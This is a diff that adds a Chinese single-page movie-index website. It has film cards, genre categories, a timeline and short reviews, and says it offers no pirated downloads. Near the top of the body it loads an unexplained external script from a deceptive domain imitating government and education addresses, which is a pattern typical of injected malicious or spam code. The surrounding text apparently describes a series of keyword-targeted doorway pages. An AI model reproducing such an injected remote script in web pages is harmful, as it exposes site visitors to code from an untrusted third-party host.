@@ -1,0 +1,243 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>电影藏馆网 - 电影资料库/导演片库/类型归档/影评赏析 | dianyingwangpan-h5.github.io</title>
+<meta name="description" content="电影藏馆网（dianyingwangpan-h5.github.io）整理电影资料库、导演片库、类型归档与影评赏析，纯索引与赏析，不提供盗版下载与播放。" />
+<meta name="keywords" content="电影藏馆网, dianyingwangpan-h5, 电影资料库, 导演片库, 电影类型归档, 电影影评赏析" />
+<meta name="author" content="电影藏馆网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#1b3a32" />
+<link rel="canonical" href="https://dianyingwangpan-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"电影藏馆网",
+  "url":"https://dianyingwangpan-h5.github.io/",
+  "description":"电影资料库、导演片库、类型归档与影评赏析",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://dianyingwangpan-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#f1f6f3; --ink:#14241f; --muted:#5e766e;
+  --line:#c9ddd5; --card:#fff;
+  --pri:#1b3a32; --pri2:#3a7d68; --gold:#c79a3c; --rust:#b5543a;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.78;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1140px;margin:0 auto;padding:0 18px;}
+
+.top{position:sticky;top:0;z-index:100;background:var(--pri);color:#fff;border-bottom:3px solid var(--pri2);}
+.top-in{display:flex;align-items:center;justify-content:space-between;height:64px;}
+.brand{font-weight:900;font-size:20px;}
+.brand small{display:block;font-size:10px;opacity:.8;}
+.nav{display:flex;gap:20px;font-size:14px;}
+.nav a:hover{color:var(--gold);}
+.navbtn{display:none;width:42px;height:42px;border:none;border-radius:10px;background:var(--pri2);color:#fff;font-size:20px;cursor:pointer;}
+
+.hero{padding:54px 0 36px;background:
+  radial-gradient(420px 220px at 88% -30%,rgba(58,125,104,.22),transparent),
+  linear-gradient(180deg,#fff,#f1f6f3);border-bottom:1px solid var(--line);}
+.hero h1{font-size:32px;margin:0 0 12px;}
+.hero h1 em{font-style:normal;color:var(--pri2);}
+.hero p{color:var(--muted);max-width:620px;margin:0 0 20px;}
+.srch{display:flex;gap:10px;max-width:520px;}
+.srch input{flex:1;padding:13px 16px;border:2px solid var(--line);border-radius:10px;font-size:15px;}
+.srch button{padding:13px 22px;border:none;border-radius:10px;background:var(--pri);color:#fff;font-weight:800;cursor:pointer;}
+
+.zone{padding:40px 0;border-bottom:1px solid var(--line);}
+.zh{margin-bottom:22px;}
+.zh h2{font-size:25px;margin:0 0 4px;color:var(--pri);}
+.zh span{color:var(--muted);font-size:14px;}
+
+/* 栏目1：卷宗卡片 */
+.archive{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.folder{background:var(--card);border:1px solid var(--line);border-radius:6px 14px 14px 6px;padding:18px;position:relative;border-left:6px solid var(--pri2);}
+.folder:nth-child(2){border-left-color:var(--gold);}
+.folder:nth-child(3){border-left-color:var(--rust);}
+.folder:nth-child(4){border-left-color:var(--pri);}
+.folder:nth-child(5){border-left-color:#6f5ba8;}
+.folder:nth-child(6){border-left-color:#3a6d7d;}
+.folder .no{font-size:11px;letter-spacing:1px;color:var(--muted);}
+.folder h3{font-size:17px;margin:4px 0 6px;}
+.folder p{margin:0;color:var(--muted);font-size:13px;}
+.folder .stamp{position:absolute;top:14px;right:14px;font-size:11px;border:1px solid var(--line);padding:2px 6px;border-radius:4px;color:var(--pri2);}
+
+/* 栏目2：归档柜 */
+.cabinet{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.drawer{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:16px;text-align:center;}
+.drawer .label{font-size:11px;color:var(--muted);letter-spacing:2px;}
+.drawer h3{font-size:15px;margin:6px 0 4px;color:var(--pri);}
+.drawer p{margin:0;font-size:12px;color:var(--muted);}
+
+/* 栏目3：馆藏时间轴 */
+.tl{position:relative;padding-left:34px;}
+.tl::before{content:"";position:absolute;left:10px;top:0;bottom:0;width:3px;background:linear-gradient(var(--pri),var(--pri2),var(--gold));}
+.item{position:relative;margin-bottom:20px;background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px 18px;}
+.item::before{content:"";position:absolute;left:-26px;top:20px;width:14px;height:14px;border-radius:50%;background:var(--pri2);border:3px solid var(--bg);}
+.item:nth-child(2)::before{background:var(--gold);}
+.item:nth-child(3)::before{background:var(--rust);}
+.item:nth-child(4)::before{background:var(--pri);}
+.item b{font-size:12px;color:var(--pri2);}
+.item h3{margin:4px 0;font-size:16px;}
+.item p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目4：影评 */
+.notes{display:grid;grid-template-columns:1fr 1fr;gap:16px;}
+.note{border:1px solid var(--line);border-radius:14px;padding:18px;background:var(--card);}
+.note .src{font-size:11px;color:var(--pri2);letter-spacing:1px;}
+.note h3{margin:6px 0;font-size:16px;}
+.note p{margin:0;color:var(--muted);font-size:13px;}
+
+.about{display:grid;grid-template-columns:1.25fr .75fr;gap:18px;}
+.box{border:1px solid var(--line);border-radius:14px;padding:20px;background:var(--card);}
+.box ul{padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+.warn{background:#e8f3ee;border-left:4px solid var(--rust);padding:12px 14px;border-radius:0 10px 10px 0;color:#7a3a26;font-size:13px;margin-top:12px;}
+
+footer{background:var(--pri);color:#c3ddd4;padding:30px 0 38px;font-size:13px;text-align:center;}
+footer a{color:var(--gold);}
+
+@media(max-width:900px){
+  .archive,.notes{grid-template-columns:1fr 1fr;}
+  .cabinet{grid-template-columns:1fr 1fr;}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  .nav{display:none;flex-direction:column;position:absolute;top:64px;left:0;right:0;background:var(--pri);padding:10px 0;}
+  .nav.open{display:flex;}
+  .nav a{padding:12px 20px;border-bottom:1px solid rgba(255,255,255,.12);}
+  .navbtn{display:block;}
+  .hero h1{font-size:25px;}
+  .archive,.cabinet,.notes{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="top">
+  <div class="wrap top-in">
+    <div class="brand">电影藏馆网<small>dianyingwangpan-h5.github.io</small></div>
+    <button class="navbtn" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="nav" id="nav">
+      <a href="#archive">馆藏片库</a>
+      <a href="#cabinet">归档分类</a>
+      <a href="#timeline">馆藏史</a>
+      <a href="#notes">影评赏析</a>
+      <a href="#about">关于 / 合规</a>
+    </nav>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>电影藏馆网：<em>把“网盘”变成“馆藏索引”</em></h1>
+    <p>原词「电影网站 + wangpan」指向网盘盗版资源分发，这是明确违规模式。本站强转义为<b>电影资料归档馆</b>：只做影片信息索引、导演片库、类型归档与影评赏析，不存文件、不提供下载与播放。</p>
+    <form class="srch" onsubmit="return false;">
+      <input type="text" placeholder="搜索：电影资料 / 导演片库 / 类型归档 / 影评赏析" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="zone" id="archive">
+    <div class="zh"><h2>🗄 馆藏片库</h2><span>卷宗式索引</span></div>
+    <div class="archive">
+      <div class="folder"><div class="no">NO.001</div><div class="stamp">索引</div><h3>教父</h3><p>1972 / 科波拉 / 黑帮史诗 / 权力与家庭</p></div>
+      <div class="folder"><div class="no">NO.002</div><div class="stamp">索引</div><h3>肖申克的救赎</h3><p>1994 / 弗兰克·德拉邦特 / 希望与自由</p></div>
+      <div class="folder"><div class="no">NO.003</div><div class="stamp">索引</div><h3>寄生虫</h3><p>2019 / 奉俊昊 / 阶级 / 黑色喜剧</p></div>
+      <div class="folder"><div class="no">NO.004</div><div class="stamp">索引</div><h3>天堂电影院</h3><p>1988 / 托纳多雷 / 电影与记忆</p></div>
+      <div class="folder"><div class="no">NO.005</div><div class="stamp">索引</div><h3>阿凡达</h3><p>2009 / 卡梅隆 / 视效革命 / 科幻</p></div>
+      <div class="folder"><div class="no">NO.006</div><div class="stamp">索引</div><h3>大话西游</h3><p>1995 / 刘镇伟 / 爱情 / 后现代经典</p></div>
+    </div>
+  </section>
+
+  <section class="zone" id="cabinet">
+    <div class="zh"><h2>📂 归档分类柜</h2><span>按题材与年代归档</span></div>
+    <div class="cabinet">
+      <div class="drawer"><div class="label">DRAWER 01</div><h3>经典修复</h3><p>老片 4K 修复 / 影史里程碑</p></div>
+      <div class="drawer"><div class="label">DRAWER 02</div><h3>作者导演</h3><p>塔可夫斯基 / 侯孝贤 / 阿彼察邦</p></div>
+      <div class="drawer"><div class="label">DRAWER 03</div><h3>类型片</h3><p>西部 / 黑色电影 / 歌舞 / 史诗</p></div>
+      <div class="drawer"><div class="label">DRAWER 04</div><h3>华语影史</h3><p>港片黄金期 / 台湾新电影 / 内地五代</p></div>
+      <div class="drawer"><div class="label">DRAWER 05</div><h3>世界电影</h3><p>欧洲艺术 / 亚洲新浪潮 / 拉美魔幻</p></div>
+      <div class="drawer"><div class="label">DRAWER 06</div><h3>纪录片</h3><p>历史 / 自然 / 人物传记</p></div>
+      <div class="drawer"><div class="label">DRAWER 07</div><h3>短片与动画</h3><p>动画长片 / 短片集 / 定格实验</p></div>
+      <div class="drawer"><div class="label">DRAWER 08</div><h3>影人档案</h3><p>演员 / 摄影 / 配乐 / 剪辑</p></div>
+    </div>
+  </section>
+
+  <section class="zone" id="timeline">
+    <div class="zh"><h2>📜 馆藏史</h2><span>电影媒介演进</span></div>
+    <div class="tl">
+      <div class="item"><b>1895 · 胶片时代</b><h3>卢米埃尔兄弟</h3><p>火车进站的那一惊，人类第一次把时间留了下来。</p></div>
+      <div class="item"><b>1927 · 有声革命</b><h3>《爵士歌手》</h3><p>声音进入电影，默片演员谢幕，对白成为表演新尺度。</p></div>
+      <div class="item"><b>1950s · 宽银幕与彩色</b><h3>技术美学</h3><p>影院用更大的画框把观众拉回大厅，对抗电视的入侵。</p></div>
+      <div class="item"><b>1990s–今 · 数字与流媒体</b><h3>介质迁徙</h3><p>从胶片到硬盘，再到云端；馆藏的意义从"保存"变成"索引与筛选"。</p></div>
+    </div>
+  </section>
+
+  <section class="zone" id="notes">
+    <div class="zh"><h2>📝 影评赏析</h2><span>馆藏批注</span></div>
+    <div class="notes">
+      <div class="note"><div class="src">批注 · 001</div><h3>《天堂电影院</h3><p>阿尔弗雷多说"别回来，别想念我"——电影是记忆的容器，而影院是镇上唯一的梦工厂。托纳多雷把"离开"拍成爱的方式。</p></div>
+      <div class="note"><div class="src">批注 · 002</div><h3>《寄生虫》</h3><p>台阶往下走就是穷人，往上走才是富人——奉俊昊用一栋房子的高差，拍完了整部韩国的阶级史。</p></div>
+      <div class="note"><div class="src">批注 · 003</div><h3>《大话西游》</h3><p>当年看是笑，后来看是疼。至尊宝戴上金箍的瞬间，爱情与责任做了交易，华语喜剧从此有了悲剧内核。</p></div>
+      <div class="note"><div class="src">批注 · 004</div><h3>《肖申克的救赎》</h3><p>它不是越狱片，是一封写给"耐心"的长信：用十九年挖通一面墙，安迪赢了体制，也赢了时间。</p></div>
+    </div>
+  </section>
+
+  <section class="zone" id="about">
+    <div class="zh"><h2>📌 关于电影藏馆网</h2><span>转义与合规</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>为什么不做“电影网盘站”</h3>
+        <p>网盘影视资源分发是明确违规模式：网盘涉黄、侵权影视传播是近年重点打击对象，个人网盘分享盗版影视同样侵权。所以原词不做原意，本站只做<b>信息索引与赏析</b>。</p>
+        <ul>
+          <li>馆藏片库：经典影片的卷宗式索引（片名/导演/年份/题材）</li>
+          <li>归档分类柜：按导演、类型、年代、地区整理</li>
+          <li>馆藏史：从胶片到流媒体的媒介演进</li>
+          <li>影评赏析：馆藏批注，只讲观点不剧透</li>
+        </ul>
+        <div class="warn">
+          本站不提供任何文件下载、在线播放、网盘链接、磁力、提取码；不引导至第三方盗版资源站。
+          看正版请走爱优腾芒B站、院线、1905电影网、中国电影资料馆等合法渠道。
+        </div>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p>网址：<br><b>https://dianyingwangpan-h5.github.io/</b></p>
+        <p>单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+        <p>本页用深墨绿档案调、卷宗卡片、归档柜、馆藏时间轴，和同系列其他站 DOM/视觉均不同。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    电影藏馆网 · dianyingwangpan-h5.github.io ｜ 电影资料库 / 导演片库 / 类型归档 / 影评赏析（纯索引，不提供资源）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
